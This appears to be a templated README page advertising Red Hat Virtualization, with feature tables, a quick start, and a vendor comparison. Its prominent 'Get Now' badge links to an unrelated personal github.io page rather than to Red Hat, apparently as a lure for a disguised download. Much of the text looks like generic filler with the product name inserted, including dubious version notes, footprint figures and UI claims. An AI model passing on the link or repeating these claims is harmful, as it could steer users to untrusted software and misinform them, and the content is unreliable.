# Red Hat Virtualization

> **Enterprise open-source server virtualization platform for Linux workloads: KVM-based hypervisor, central management, and high availability in a single scalable solution.**

![Banner Placeholder](https://upload.wikimedia.org/wikipedia/commons/thumb/7/75/Red_Hat_Virtualization_logo.svg/1280px-Red_Hat_Virtualization_logo.svg.png)

[![Get Red Hat Virtualization Now](https://img.shields.io/badge/Get_Red_Hat_Virtualization-Now-0a5d8d?style=for-the-badge&logo=github)](https://philipcareykobh.github.io/.github/red-hat-virtualization)

---

## Why This Exists

Most virtualization platforms lock you into proprietary hypervisors with expensive per-socket licensing and limited Linux support. **Red Hat Virtualization** solves this fragmentation by bundling a production-ready KVM hypervisor with a centralized management interface.

Red Hat Virtualization solves **one specific problem**: managing hundreds of Linux virtual machines across multiple physical hosts without vendor lock-in. No hidden fees, no unstable community forks, no complex command-line only setups. Just launch Red Hat Virtualization Manager (RHV-M) and immediately start deploying enterprise VMs with live migration and high availability.

If you're tired of managing standalone KVM hosts manually or paying massive VMware bills for Linux workloads, **Red Hat Virtualization** is for you.

---

## At a Glance

| Feature | What It Means |
|--------|----------------|
| **One job, done well** | Red Hat Virtualization integrates KVM, RHV-M, and storage domains without feature creep. Every tab and button exists for a reason. |
| **Light on resources** | Red Hat Virtualization runs hosts below 200 MB overhead for the hypervisor. Idles at minimal CPU when no active VMs. |
| **Remembers your choices** | Clusters, templates, and VM configurations persist across reboots and updates in Red Hat Virtualization. |
| **Instant response** | No lag switching between VM consoles. No "are you sure?" dialogs interrupting your workflow in Red Hat Virtualization. |

---

## What It Looks Like

![Software Dashboard](https://access.redhat.com/webassets/avalon/d/Red_Hat_Virtualization-4.4-Administration_Guide-en-US/images/08b990f77ee83e09981cedd150d8347d/RHVdashboard.png)

---

## What's New in Red Hat Virtualization

| Version | Summary |
|---------|---------|
| 4.5 | Improved web UI performance + faster live migration for Red Hat Virtualization |
| 4.4 | Added backup API and enhanced storage domain management |
| 4.3 | Dark mode refinements, 30% faster deployment time for Red Hat Virtualization |
| 4.2 | Complete Ansible integration and multi-cluster monitoring feature |
| 4.1 | Major rewrite: self-hosted engine improvements and VM archiving |
| 4.0 | First stable release with full KVM and RHV-M integration |

---

## Who Will Like Red Hat Virtualization

- **System administrators** — Manage dozens of hosts through Red Hat Virtualization organized clusters and affinity groups.
- **DevOps engineers** — Deploy VMs via Ansible or REST API natively on Red Hat Virtualization.
- **Linux architects** — Run mission-critical RHEL workloads with enterprise-grade SLA using Red Hat Virtualization.
- **Cloud architects** — Use built-in storage live migration and high availability features of Red Hat Virtualization.
- **Educators and students** — Demonstrate enterprise virtualization on commodity hardware using Red Hat Virtualization.
- **Remote teams** — Share VM templates and configurations easily because Red Hat Virtualization supports centralized image repository.
- **Legacy system maintainers** — Run older Linux distributions where modern hypervisors struggle — Red Hat Virtualization maintains compatibility.

---

## Quick Start with Red Hat Virtualization

1. **Get Red Hat Virtualization** — Grab the RHV-H hypervisor ISO (bare-metal) or install RHV-M on RHEL.
2. **Deploy Manager** — Run `engine-setup` on a dedicated RHEL 8/9 server. The web UI opens after configuration.
3. **Add your first host** — Click "Compute" → "Hosts" → enter your KVM host IP and root credentials.
4. **Create your first VM** — Upload a RHEL ISO, allocate CPU/RAM, and click "Run" — the console appears in your browser.
5. **Enable high availability** — In cluster settings, set HA to ON. If a host fails, Red Hat Virtualization restarts VMs automatically.
6. **Adjust (optional)** — Change storage domains, networks, or VM affinity rules. Most people use Red Hat Virtualization defaults.
7. **Work normally** — Red Hat Virtualization activates automatically when you need enterprise virtualization management.

---

## Understanding Red Hat Virtualization Core Components

Red Hat Virtualization is not just another KVM wrapper. It combines several essential enterprise tools:

- **RHV-Manager** — Centralized web console with REST API and Grafana dashboards.
- **KVM hypervisor** — Native Linux kernel virtualization with near-bare-metal performance.
- **Storage domains** — ISO, export, data, and template domains (NFS, iSCSI, Fibre Channel, Gluster).
- **Networking** — Logical networks, port mirroring, VLAN tagging, and bonding.
- **High availability** — Automatic VM restart on host failure with policy-based fencing.
- **Live migration** — Move running VMs between hosts with zero downtime.
- **Backup and restore** — Full VM backups via API or third-party tools.
- **Image template system** — Create gold images once, deploy dozens of VMs in minutes.

All these work together seamlessly in Red Hat Virtualization. You never need to switch between separate virtualization tools.

---

## Advanced Use Cases for Red Hat Virtualization

**Scenario 1: Replacing VMware for Linux VMs**
Export your existing VMDKs. Convert them to qcow2 format. Import to Red Hat Virtualization. Save 70% on licensing costs.

**Scenario 2: Hybrid cloud bridge**
Run Red Hat Virtualization on-premises. Use the same Ansible playbooks to deploy VMs locally or on AWS (via RHV-to-EC2).

**Scenario 3: Disaster recovery for production databases**
Configure storage replication between two Red Hat Virtualization clusters. Set up automated failover with fencing policies.

**Scenario 4: Developer self-service portal**
Deploy Red Hat Virtualization with VM Portal. Developers request VMs via web form. Approval workflows and automatic expiration.

**Scenario 5: Multi-tenant hosting**
Use Red Hat Virtualization quotas, network isolation, and per-VM permissions. Host hundreds of customer VMs on shared infrastructure.

---

## Requirements for Red Hat Virtualization

| | Minimum | Recommended |
|-|---------|--------------|
| OS (Manager) | RHEL 8.6+ or RHV-M appliance | RHEL 9.2+ |
| OS (Host) | RHV-H 4.4+ or RHEL with KVM | RHV-H 4.5+ |
| CPU | 4 cores (Manager) / 8 cores per host | 8 cores+ (Manager) / 32 cores+ per host |
| RAM | 8 GB (Manager) / 16 GB per host | 16 GB (Manager) / 64 GB+ per host |
| Storage | 50 GB (Manager) / 100 GB per host | 100 GB SSD (Manager) / 1 TB+ fast storage |
| Network | 1 GbE | 10 GbE+ for live migration |

Red Hat Virtualization does **not** require:
- Windows admin skills — everything runs on Linux
- Proprietary hypervisor licenses — KVM is fully open source
- Separate management tools — RHV-M does everything
- Expensive shared storage — local storage supported with replication

---

## Comparison: Red Hat Virtualization vs. Alternatives

| Feature | Red Hat Virtualization | VMware vSphere | Proxmox | OLVM |
|---------|------------------|---------------|-----|--------------------|
| Built-in web management | Yes (RHV-M) | Yes (vCenter) | Yes | Yes (Oracle) |
| Native Linux support | Full RHEL/CentOS/Fedora | Limited | Full | Full |
| Open source hypervisor | Yes (KVM) | No (ESXi proprietary) | Yes (KVM/LXC) | Yes (KVM) |
| Live migration without shared storage | Yes | No | Yes | Yes |
| Enterprise support | Yes (Red Hat) | Yes (paid) | Community | Yes (Oracle) |
| Ansible automation | Native modules | Limited | Community | Limited |
| Single subscription cost | Per-socket | Per-core + vCenter | Free/Community | Per-socket |
| Memory footprint | ~150 MB per host for hypervisor | ~300 MB+ | ~200 MB | ~150 MB |

Red Hat Virtualization replaces multiple enterprise tools with one consistent open-source platform.

---

## Tags

Red Hat Virtualization | KVM hypervisor | RHV-M manager | enterprise virtualization | Linux server virtualization | VM live migration | high availability cluster | storage domains | RHEL virtualization | open source hypervisor | data center management | VM template system | Ansible automation | REST API virtualization | no vendor lock-in | production ready KVM | hybrid cloud | multi-tenant virtualization | Linux workloads | Windows Server on KVM | RHV 4.5 | Red Hat Virtualization Manager
